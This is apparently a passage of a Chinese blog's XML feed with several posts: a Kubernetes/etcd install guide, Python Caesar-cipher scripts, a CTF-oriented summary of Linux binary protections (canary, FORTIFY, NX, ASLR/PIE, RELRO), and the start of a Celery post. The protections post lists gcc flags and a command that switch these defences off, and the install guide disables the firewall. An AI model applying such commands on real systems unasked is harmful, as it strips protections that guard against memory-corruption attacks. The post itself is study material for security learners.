title="安装主要程序"></a>安装主要程序</h3><ul><li>192.168.29.11<br>执行以下命令，安装kubernetes和etcd</li></ul><pre><code>yum -y install --enablerepo=virt7-docker-common-release kubernetes etcd</code></pre><h2 id="禁用防火墙"><a href="#禁用防火墙" class="headerlink" title="禁用防火墙"></a>禁用防火墙</h2><pre><code>systemctl disable iptables-services firewalldsystemctl stop iptables-services firewalld</code></pre><h3 id="192-168-29-11-上主机配置"><a href="#192-168-29-11-上主机配置" class="headerlink" title="192.168.29.11 上主机配置"></a>192.168.29.11 上主机配置</h3><h4 id="一-修改文件-etc-kubernetes-config-所有节点"><a href="#一-修改文件-etc-kubernetes-config-所有节点" class="headerlink" title="一 修改文件/etc/kubernetes/config(所有节点)"></a>一 修改文件/etc/kubernetes/config(所有节点)</h4><p>注意，master和slave主机都要修改<br>指定master主机的ip，文件内容如下：</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-f2286b4085fb8079.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="二-修改配置文件-etc-etcd-etcd-conf-确保etcd监听所有地址。内容如下"><a href="#二-修改配置文件-etc-etcd-etcd-conf-确保etcd监听所有地址。内容如下" class="headerlink" title="二 修改配置文件/etc/etcd/etcd.conf,确保etcd监听所有地址。内容如下"></a>二 修改配置文件/etc/etcd/etcd.conf,确保etcd监听所有地址。内容如下</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-a881113924dd47da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="三-修改配置文件-etc-kubernetes-apiserver"><a href="#三-修改配置文件-etc-kubernetes-apiserver" class="headerlink" title="三 修改配置文件/etc/kubernetes/apiserver"></a>三 修改配置文件/etc/kubernetes/apiserver</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-83c145be3b651c13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="四-修改配置文件-etc-kubernetes-controller-manager，定义slave主机ip地址"><a href="#四-修改配置文件-etc-kubernetes-controller-manager，定义slave主机ip地址" class="headerlink" title="四 修改配置文件/etc/kubernetes/controller-manager，定义slave主机ip地址"></a>四 修改配置文件/etc/kubernetes/controller-manager，定义slave主机ip地址</h4><p><img src="http://upload-images.jianshu.io/upload_images/3941016-6a410aa1eaf7d1b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="在master主机上，启动服务"><a href="#在master主机上，启动服务" class="headerlink" title="在master主机上，启动服务"></a>在master主机上，启动服务</h3><pre><code>for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do    systemctl restart $SERVICES    systemctl enable $SERVICES    systemctl status $SERVICESdone</code></pre><h2 id="slave节点配置"><a href="#slave节点配置" class="headerlink" title="slave节点配置"></a>slave节点配置</h2><p>yum 安装kubernetes</p><pre><code>yum -y install  kubernetes flannel</code></pre><h3 id="slave-配置文件修改"><a href="#slave-配置文件修改" class="headerlink" title="slave 配置文件修改"></a>slave 配置文件修改</h3><h4 id="一-修改kubernetes配置文件，指定master"><a href="#一-修改kubernetes配置文件，指定master" class="headerlink" title="一 .修改kubernetes配置文件，指定master"></a>一 .修改kubernetes配置文件，指定master</h4><p>/etc/kubernetes/config</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-2181a58f95b1164b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h4 id="二-配置kubelet服务"><a href="#二-配置kubelet服务" class="headerlink" title="二  配置kubelet服务"></a>二  配置kubelet服务</h4><p> /etc/kubernetes/kubelet</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-5d1fb93275d32ac5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="在slave主机上，启动服务"><a href="#在slave主机上，启动服务" class="headerlink" title="在slave主机上，启动服务"></a>在slave主机上，启动服务</h3><pre><code>for SERVICES in kube-proxy kubelet docker flanneld; do    systemctl restart $SERVICES    systemctl enable $SERVICES    systemctl status $SERVICESdone</code></pre><p>###验证</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-f8344025c3bc9b20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凯撒密码的加密解密</title>
      <link href="/2018/09/07/kaisa/"/>
      <url>/2018/09/07/kaisa/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>凯撒密码作为一种最为古老的对称加密体制，在古罗马的时候都已经很流行，他的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。</p></blockquote><a id="more"></a><h1 id="凯撒密码加密脚"><a href="#凯撒密码加密脚" class="headerlink" title="凯撒密码加密脚"></a>凯撒密码加密脚</h1><ul><li>交单的26次加密脚本</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>upperDict<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">,</span><span class="token string">'C'</span><span class="token punctuation">,</span><span class="token string">'D'</span><span class="token punctuation">,</span><span class="token string">'E'</span><span class="token punctuation">,</span><span class="token string">'F'</span><span class="token punctuation">,</span><span class="token string">'G'</span><span class="token punctuation">,</span><span class="token string">'H'</span><span class="token punctuation">,</span><span class="token string">'I'</span><span class="token punctuation">,</span><span class="token string">'J'</span><span class="token punctuation">,</span><span class="token string">'K'</span><span class="token punctuation">,</span><span class="token string">'L'</span><span class="token punctuation">,</span><span class="token string">'M'</span><span class="token punctuation">,</span><span class="token string">'N'</span><span class="token punctuation">,</span><span class="token string">'O'</span><span class="token punctuation">,</span><span class="token string">'P'</span><span class="token punctuation">,</span><span class="token string">'Q'</span><span class="token punctuation">,</span><span class="token string">'R'</span><span class="token punctuation">,</span><span class="token string">'S'</span><span class="token punctuation">,</span><span class="token string">'T'</span><span class="token punctuation">,</span><span class="token string">'U'</span><span class="token punctuation">,</span><span class="token string">'V'</span><span class="token punctuation">,</span><span class="token string">'W'</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">,</span><span class="token string">'Y'</span><span class="token punctuation">,</span><span class="token string">'Z'</span><span class="token punctuation">]</span>lowerDict<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'d'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'j'</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'s'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'v'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'z'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">cesarWithLetter</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    凯撒密码 :        只转换字母(包括大写小写)    参数 :         ciphertext : 明文        offset : 偏移量    '''</span>    result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> ciphertext<span class="token punctuation">:</span>        <span class="token keyword">if</span> ch<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>upperDict<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>upperDict<span class="token punctuation">.</span>index<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> ch<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>lowerDict<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lowerDict<span class="token punctuation">.</span>index<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token operator">+</span>offset<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">elif</span> ch<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>ch        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token operator">=</span>result<span class="token operator">+</span>ch    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">printAllResult</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    打印所有偏移结果    '''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>upperDict<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> cesarWithLetter<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span>i<span class="token punctuation">)</span>ciphertext<span class="token operator">=</span>raw_input<span class="token punctuation">(</span><span class="token string">"Please input the words :"</span><span class="token punctuation">)</span>printAllResult<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span></code></pre><h1 id="自动控制偏移位自动解密"><a href="#自动控制偏移位自动解密" class="headerlink" title="自动控制偏移位自动解密"></a>自动控制偏移位自动解密</h1><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*-coding:utf-8-*-</span>__author__ <span class="token operator">=</span> <span class="token number">007</span>__date__ <span class="token operator">=</span> <span class="token number">2016</span> <span class="token operator">/</span> <span class="token number">02</span> <span class="token operator">/</span> <span class="token number">04</span><span class="token comment" spellcheck="true">#==================================================================#</span><span class="token comment" spellcheck="true">#         凯撒密码(caesar)是最早的代换密码,对称密码的一种                #</span><span class="token comment" spellcheck="true">#   算法：将每个字母用字母表中它之后的第k个字母（称作位移值）替代            #</span><span class="token comment" spellcheck="true">#==================================================================#</span><span class="token keyword">def</span> <span class="token function">encryption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str_raw <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请输入明文："</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入位移值："</span><span class="token punctuation">)</span>    str_change <span class="token operator">=</span> str_raw<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    str_list <span class="token operator">=</span> list<span class="token punctuation">(</span>str_change<span class="token punctuation">)</span>    str_list_encry <span class="token operator">=</span> str_list    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">(</span>str_list<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">123</span><span class="token operator">-</span>k<span class="token punctuation">:</span>            str_list_encry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> k<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            str_list_encry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> k <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span>        i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span> <span class="token string">"加密结果为："</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str_list_encry<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    str_raw <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请输入密文："</span><span class="token punctuation">)</span>    k <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入位移值："</span><span class="token punctuation">)</span>    str_change <span class="token operator">=</span> str_raw<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    str_list <span class="token operator">=</span> list<span class="token punctuation">(</span>str_change<span class="token punctuation">)</span>    str_list_decry <span class="token operator">=</span> str_list    i <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">(</span>str_list<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">97</span><span class="token operator">+</span>k<span class="token punctuation">:</span>            str_list_decry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> k<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            str_list_decry<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>str_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">-</span> k<span class="token punctuation">)</span>        i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">print</span> <span class="token string">"解密结果为："</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str_list_decry<span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> u<span class="token string">"1. 加密"</span>    <span class="token keyword">print</span> u<span class="token string">"2. 解密"</span>    choice <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token string">"请选择："</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">:</span>        encryption<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">"2"</span><span class="token punctuation">:</span>        decryption<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> u<span class="token string">"您的输入有误！"</span><span class="token comment" spellcheck="true">#if __name__ == "__main__":</span><span class="token comment" spellcheck="true">#    main</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux程序的保护机制</title>
      <link href="/2018/07/16/linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/07/16/linux%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>最近看了一些PWN 的题目，在此总结一波，这篇文章有些资料来自各网友的总结。像我这样记忆力比较差的人，还是要多记录。</p><p><img src="https://upload-images.jianshu.io/upload_images/3941016-ff02e0571c8fca70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的。</p></blockquote><a id="more"></a><ul><li><p>关于 NX  PIE的参考链接 </p><p> <a href="http://tacxingxing.com/2017/07/15/pie-alsr/" target="_blank" rel="noopener">http://tacxingxing.com/2017/07/15/pie-alsr/</a></p></li></ul><p>##一、关于 checksec</p><blockquote><p>Checksec是一个bash脚本，用于检查可执行文件的属性（如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）。它最初由Tobias Klein编写，原始资料来源<br> <a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">www.trapkit.de/tools/checksec.html</a></p><ul><li>github  地址</li></ul></blockquote><p>  <a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">https://github.com/slimm609/checksec.sh</a></p><ul><li>使用说明</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/3941016-7bba2e6e12911116.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>具体的例子（如果安装gdb自带checksec）<br><img src="https://upload-images.jianshu.io/upload_images/3941016-1d7e05beb2dc86e4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><h2 id="二、CANNARY-栈保护"><a href="#二、CANNARY-栈保护" class="headerlink" title="二、CANNARY(栈保护)"></a>二、CANNARY(栈保护)</h2><p>这个选项表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><pre><code>gcc -o test test.c                        // 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c  //禁用栈保护gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</code></pre><h2 id="三、-FORTIFY"><a href="#三、-FORTIFY" class="headerlink" title="三、 FORTIFY"></a>三、 FORTIFY</h2><ul><li><p>介绍<br>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p></li><li><p>说明<br>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p><p> _FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p>gcc -D_FORTIFY_SOURCE=1 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;)</p><p>gcc -D_FORTIFY_SOURCE=2 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p></li></ul><ul><li>举个例子可能简单明了一些：一段简单的存在缓冲区溢出的C代码</li></ul><pre><code>void fun(char *s) {        char buf[0x100];        strcpy(buf, s);        /* Don&#39;t allow gcc to optimise away the buf */        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));}</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p><pre><code>08048450 &lt;fun&gt;:  push   %ebp               ;   mov    %esp,%ebp  sub    $0x118,%esp        ; 将0x118存储到栈上  mov    0x8(%ebp),%eax     ; 将目标参数载入eax  mov    %eax,0x4(%esp)     ; 保存目标参数  lea    -0x108(%ebp),%eax  ; 数组buf  mov    %eax,(%esp)        ; 保存  call   8048320 &lt;strcpy@plt&gt;  leave                     ;   ret</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p><pre><code>08048470 &lt;fun&gt;:  push   %ebp               ;   mov    %esp,%ebp  sub    $0x118,%esp        ;   movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存  mov    0x8(%ebp),%eax     ;   mov    %eax,0x4(%esp)     ;   lea    -0x108(%ebp),%eax  ;   mov    %eax,(%esp)        ;   call   8048370 &lt;__strcpy_chk@plt&gt;  leave                      ;   ret</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p><p>总结下就有:</p><pre><code>gcc -o test test.c                            // 默认情况下，不会开这个检查gcc -D_FORTIFY_SOURCE=1 -o test test.c        // 较弱的检查gcc -D_FORTIFY_SOURCE=2 -o test test.c        // 较强的检查</code></pre><h2 id="四、NX（DEP）-数据执行保护-Data-Execution-Prevention"><a href="#四、NX（DEP）-数据执行保护-Data-Execution-Prevention" class="headerlink" title="四、NX（DEP）(数据执行保护 Data Execution Prevention)"></a>四、NX（DEP）(数据执行保护 Data Execution Prevention)</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><ul><li>工作流程<br><img src="https://upload-images.jianshu.io/upload_images/3941016-4cb874d7ecbbfbc1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="DEP.png"></li></ul><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><pre><code>gcc -o test test.c                    // 默认情况下，开启NX保护gcc -z execstack -o test test.c        // 禁用NX保护gcc -z noexecstack -o test test.c    // 开启NX保护</code></pre><ul><li><p>参考介绍文章</p><p>dep原理及突破方法  [1]:<a href="https://blog.csdn.net/zy_strive_2012/article/details/9119153" target="_blank" rel="noopener">https://blog.csdn.net/zy_strive_2012/article/details/9119153</a></p></li></ul><h1 id="五、PIE（ASLR）"><a href="#五、PIE（ASLR）" class="headerlink" title="五、PIE（ASLR）"></a>五、PIE（ASLR）</h1><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><pre><code>0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><ul><li>liunx下关闭PIE的命令如下：</li></ul><pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>-gcc 编译命令</p><pre><code>gcc -o test test.c                // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE</code></pre><ul><li>说明</li></ul><p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考<a href="http://writeblog.csdn.net/2009/11/20/10065/" target="_blank" rel="noopener">Gcc和Open64中的-fPIC选项</a>.</p><p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p><p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p><h2 id="六、RELRO"><a href="#六、RELRO" class="headerlink" title="六、RELRO"></a>六、RELRO</h2><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><ul><li>gcc编译：</li></ul><pre><code>gcc -o test test.c                        // 默认情况下，是Partial RELROgcc -z norelro -o test test.c            // 关闭，即No RELROgcc -z lazy -o test test.c                // 部分开启，即Partial RELROgcc -z now -o test test.c                // 全部开启，即</code></pre><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><pre><code>1. NX：-z execstack / -z noexecstack (关闭 / 开启)2. Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)3. PIE：-no-pie / -pie (关闭 / 开启)4. RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</code></pre><p>##八、入门的参考文章</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/" target="_blank" rel="noopener">缓冲区溢出的应用实例</a><br><a href="https://github.com/ctfs" target="_blank" rel="noopener">CTF github资源整合</a><br><a href="https://www.jianshu.com/p/187b810e78d2" target="_blank" rel="noopener">PWN的入门</a><br><a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃</a></p>]]></content>
      
      
      <categories>
          
          <category> linux程序的保护机制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python中的任务队列</title>
      <link href="/2018/01/02/python-task-ququ22e/"/>
      <url>/2018/01/02/python-task-ququ22e/</url>
      
        <content type="html"><![CDATA[<ul><li>为什么要做任务队列</li></ul><p>要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。</p><a id="more"></a><ul><li><p>任务队列的意义：</p><p>打个比方如果出现人的速度跟不上机器速度怎么办，这个时候我们就需要第三方，监管人员（任务队列）把机器生产的东西，放在一个地方，（队列），然后分配给每个用户，有条不理的执行。</p></li></ul><blockquote><p> python 里面的celery  模块是一个简单，灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p></blockquote><ul><li>关于安装celery</li></ul><pre><code>pip  install Celery</code></pre><h1 id="关于celery-的概念介绍"><a href="#关于celery-的概念介绍" class="headerlink" title="关于celery 的概念介绍"></a>关于celery 的概念介绍</h1><p><strong>消息队列</strong><br>消息队列的输入是工作的一个单元，称为任务，独立的职程（Worker）进程持续监视队列中是否有需要处理的新任务。<br>Celery 用消息通信，通常使用中间人（Broker）在客户端和职程间斡旋。这个过程从客户端向队列添加消息开始，之后中间人把消息派送给职程，职程对消息进行处理。如下图所示：<br> <img src="http://upload-images.jianshu.io/upload_images/3941016-00078436898975e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt><br>Celery 